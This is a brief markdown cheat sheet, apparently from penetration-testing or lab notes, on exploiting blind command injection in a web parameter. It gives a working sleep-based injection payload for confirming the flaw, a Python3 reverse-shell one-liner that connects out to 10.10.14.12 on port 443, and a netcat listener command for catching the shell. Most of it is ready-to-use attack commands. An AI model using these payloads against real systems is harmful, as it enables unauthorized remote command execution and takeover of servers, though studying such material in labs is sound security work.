# Blind Command Injection Test

Testing for blind command injection  

If you suspect a web parameter is vulnerable to command injection but the response is not reflecting any commands injected, test with sleep condition.  

### Bash oneliner if condition test command is going to wait for 10 seconds sleep if file does exist on the target.
```bash
;if [ -f /usr/bin/python3 ]; then sleep 10; else sleep 0; fi
```
* Note: URL encode the injected command before sending to target.  

If the above command results in a response taking 10+ seconds to return, good case for blind command injection on linux target.

### Below is oneline python3 reverse shell
```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.12",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
![Command Injection POST Request](command-injections.png)

### Before sending above Python3 reverse shell command injection, have netcat ready and listening on port 443.
```bash
rlwrap nc -nvlp 443
```
![NetCat listening on port 443 for incoming reverse shell from target](netcat443.png)
